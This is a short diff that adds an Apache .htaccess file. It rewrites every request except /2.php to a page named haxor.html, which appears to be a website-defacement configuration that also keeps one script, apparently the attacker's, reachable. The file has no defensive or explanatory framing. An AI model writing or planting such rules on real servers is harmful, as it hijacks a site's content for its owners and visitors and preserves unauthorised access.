@@ -1,0 +1,6 @@
+RewriteEngine On
+
+
+RewriteCond %{REQUEST_URI} !^/2\.php$
+
+RewriteRule ^ haxor.html [L]
